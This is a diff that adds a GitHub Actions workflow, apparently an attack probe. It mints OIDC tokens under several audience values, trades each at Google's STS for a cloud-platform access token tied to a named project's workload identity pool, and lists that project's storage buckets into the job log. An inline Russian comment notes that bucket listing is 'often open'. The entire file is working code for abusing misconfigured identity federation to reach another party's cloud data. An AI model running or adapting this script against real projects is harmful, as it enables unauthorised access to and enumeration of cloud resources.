@@ -1,0 +1,25 @@
+name: wif-probe7
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          runprobe() {
+            local A="$1"
+            local OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$A")")
+            local T=$(echo "$OIDC" | jq -r .value)
+            local STS=$(curl -s -X POST https://sts.googleapis.com/v1/token -H "Content-Type: application/json" -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"//iam.googleapis.com/projects/766873424314/locations/global/workloadIdentityPools/pool-id-github-actions/providers/ga-bundler\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requested_token_type\":\"urn:ietf:params:oauth:token-type:access_token\",\"subject_token\":\"$T\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:jwt\"}")
+            local ACC=$(echo "$STS" | jq -r .access_token)
+            echo "=== [$A] acc_len=${#ACC}"
+            # GCS list buckets (storage) - часто бывает открыт
+            curl -s "https://storage.googleapis.com/storage/v1/b?project=766873424314" -H "Authorization: Bearer $ACC" | head -c 300
+            echo ""
+          }
+          runprobe "https://iam.googleapis.com/projects/766873424314/locations/global/workloadIdentityPools/pool-id-github-actions/providers/ga-bundler"
+          runprobe "https://container.googleapis.com/"
+          runprobe "https://storage.googleapis.com/"
